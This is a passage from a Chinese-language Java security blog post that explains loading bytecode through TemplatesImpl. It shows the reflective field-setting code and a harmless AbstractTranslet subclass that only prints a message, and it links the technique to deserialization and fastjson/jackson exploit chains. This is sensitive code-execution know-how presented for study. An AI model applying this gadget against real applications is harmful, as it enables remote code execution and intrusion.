</span><br><span class="line">            setFieldValue(obj, &quot;_tfactory&quot;, new TransformerFactoryImpl());  </span><br><span class="line">            obj.newTransformer();  </span><br><span class="line">        &#125;  </span><br><span class="line">        public static void setFieldValue(Object obj,String name, Object value) throws NoSuchFieldException, IllegalAccessException &#123;  </span><br><span class="line">            Field field = obj.getClass().getDeclaredField(name);  </span><br><span class="line">            field.setAccessible(true);  </span><br><span class="line">            field.set(obj,value);  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>其中 ，setFieldValue 方法用来设置私有属性，可见，这里我设置了三个属性： _bytecodes 、 _name 和 _tfactory 。 _bytecodes 是由字节码组成的数组； _name 可以是任意字符串，只要不为null即可； _tfactory 需要是一个 TransformerFactoryImpl 对象，因为 TemplatesImpl#defineTransletClasses() 方法里有调用到 _tfactory.getExternalExtensionsMap() ，如果是null会出错</p><p>但有个点需要注意 TemplatesImpl 中对加载的字节码是有一定要求的：这个字节码对应的类必须是 com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet 的子类。<br>分析下具体原因：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">private int _transletIndex = -1;</span><br><span class="line">..............................</span><br><span class="line"></span><br><span class="line">if (superClass.getName().equals(ABSTRACT_TRANSLET)) &#123;</span><br><span class="line">    _transletIndex = i;</span><br><span class="line">&#125;</span><br><span class="line"> else &#123;</span><br><span class="line">    _auxClasses.put(_class[i].getName(), _class[i]);</span><br><span class="line">    &#125;     </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if (_transletIndex &lt; 0) &#123;</span><br><span class="line">   ErrorMsg err= new ErrorMsg(ErrorMsg.NO_MAIN_TRANSLET_ERR, _name);</span><br><span class="line">   throw new TransformerConfigurationException(err.toString());</span><br><span class="line">            &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>在defineTransletClasses()中，else中的_auxClasses默认值为null，所以调用put方法后就会报错，而且_transletIndex 默认值为-1，即使给_auxClasses赋值也会在下边的if处抛出异常从而报错，所以这里就需要进入if语句，而if中会判断父类名是否跟ABSTRACT_TRANSLET相同，跟进看下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">private static String ABSTRACT_TRANSLET</span><br><span class="line">= &quot;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet&quot;;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>所以在构造时就需要继承于<code>AbstractTranslet</code>，而<code>AbstractTranslet</code>是个抽象类就需要实现它未实现的接口，可以看到第一个的&#96;transform()</p><p>而<code>AbstractTranslet</code>还继承了<code>Translet</code>，<code>Translet</code>也有一个<code>transform()</code>没有实现，所以在这里就需要同时实现两个类的<code>transform()</code>，即：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">import com.sun.org.apache.xalan.internal.xsltc.DOM; </span><br><span class="line">import com.sun.org.apache.xalan.internal.xsltc.TransletException; </span><br><span class="line">import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet; </span><br><span class="line">import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator; </span><br><span class="line">import com.sun.org.apache.xml.internal.serializer.SerializationHandler; </span><br><span class="line">public class HelloTemplatesImpl extends AbstractTranslet &#123; </span><br><span class="line">public void transform(DOM document, SerializationHandler[] handlers) throws TransletException &#123;&#125; </span><br><span class="line">public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException &#123;&#125; </span><br><span class="line">public HelloTemplatesImpl() &#123; </span><br><span class="line">super();</span><br><span class="line">System.out.println(&quot;Hello TemplatesImpl&quot;); </span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>它继承了 AbstractTranslet 类，并在构造函数里插入Hello的输出。将其编译成字节码，即可被 TemplatesImpl 执行了：<br><img src="/2023/05/16/JAVA%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD%E5%AD%97%E8%8A%82%E7%A0%81/9.png" alt="one"></p><p>实测 jdk 66 无法执行， 而jdk 321 可以 ，在多个Java反序列化利用链，以及fastjson、jackson的漏洞中，都曾出现过 TemplatesImpl 的身影，这 个系列后文中仍然会再次见到它的身影。</p><h1 id="利用BCEL-ClassLoader加载字节码"><a href="#利用BCEL-ClassLoader加载字节码" class="headerlink" title="利用BCEL ClassLoader加载字节码"></a>利用BCEL ClassLoader加载字节码</h1><p>可以先参考 p 神的 [BCEL Cassloader](<a href="https://www.leavesongs.com/PENETRATION/where-is-bcel-classloader.html">BCEL ClassLoader去哪了 | 离别歌 (leavesongs.com)</a>)</p>]]></content>
      
      
      <categories>
          
          <category> JAVA安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> JAVA </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
